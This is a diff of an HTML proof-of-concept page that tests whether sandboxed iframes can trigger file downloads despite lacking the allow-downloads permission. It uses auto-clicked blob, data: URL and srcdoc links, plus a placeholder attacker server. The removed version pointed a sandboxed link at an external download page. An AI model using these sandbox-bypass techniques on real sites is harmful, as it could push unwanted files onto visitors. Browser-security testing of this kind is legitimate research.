@@ -1,29 +1,109 @@
 <!DOCTYPE html>
-
 <html lang="id">
 <head>
-    <meta charset="UTF-8">
-    <title>PoC Allow-Downloads Bypass Test</title>
+<meta charset="UTF-8">
+<title>Allow-Downloads Bypass</title>
+<style>
+body { font-family: sans-serif; }
+iframe { width: 100%; height: 120px; border: 2px dashed red; margin-bottom: 10px; }
+button { margin: 5px; }
+</style>
 </head>
 
 <body>
-    <h2>Sandbox allow-popups test (anchor based)</h2>
 
-```
-<button onclick="runExploit()">Klik untuk inject iframe</button>
+<h3>1. Content-Disposition Test</h3>
+<button onclick="test1()">Run</button>
+<div id="t1"></div>
+
+<h3>2. Blob Download Test</h3>
+<button onclick="test2()">Run</button>
+<div id="t2"></div>
+
+<h3>3. data: URL Download</h3>
+<button onclick="test3()">Run</button>
+<div id="t3"></div>
+
+<h3>4. srcdoc auto download</h3>
+<button onclick="test4()">Run</button>
+<div id="t4"></div>
+
+<h3>5. PDF Viewer Test</h3>
+<button onclick="test5()">Run</button>
+<div id="t5"></div>
+
+<h3>6. Popup Control (NOT BYPASS)</h3>
+<button onclick="test6()">Run</button>
+<div id="t6"></div>
 
 <script>
-    function runExploit() {
-        let f = document.createElement('iframe');
-        f.sandbox = 'allow-popups allow-scripts allow-forms';
-        f.srcdoc = `
-            <a href="https://form349.vercel.app/githubreps/download.html" target="_blank">
-                Click me
-            </a>
-        `;
 
-        document.body.appendChild(f);
-    }
+const BASE = "https://YOUR-SERVER"; // ganti domain lu
+
+function test1() {
+    t1.innerHTML = `
+    <iframe sandbox="allow-scripts"
+    src="${BASE}/download"></iframe>
+    `;
+}
+
+function test2() {
+    t2.innerHTML = `
+    <iframe sandbox="allow-scripts"
+    srcdoc="
+    <script>
+    let blob = new Blob(['test'], {type:'text/plain'});
+    let url = URL.createObjectURL(blob);
+    let a = document.createElement('a');
+    a.href = url;
+    a.download = 'test.txt';
+    a.click();
+    <\/script>
+    ">
+    </iframe>
+    `;
+}
+
+function test3() {
+    t3.innerHTML = `
+    <iframe sandbox="allow-scripts"
+    srcdoc="
+    <a id='x' href='data:text/plain,hello' download>dl</a>
+    <script>x.click()<\/script>
+    ">
+    </iframe>
+    `;
+}
+
+function test4() {
+    t4.innerHTML = `
+    <iframe sandbox="allow-scripts"
+    srcdoc="
+    <a id='dl' href='${BASE}/download' download>dl</a>
+    <script>dl.click()<\/script>
+    ">
+    </iframe>
+    `;
+}
+
+function test5() {
+    t5.innerHTML = `
+    <iframe sandbox
+    src="${BASE}/file.pdf"></iframe>
+    `;
+}
+
+function test6() {
+    t6.innerHTML = `
+    <iframe sandbox="allow-popups"
+    srcdoc="
+    <a href='${BASE}/download' target='_blank'>click</a>
+    ">
+    </iframe>
+    `;
+}
+
 </script>
+
 </body>
 </html>
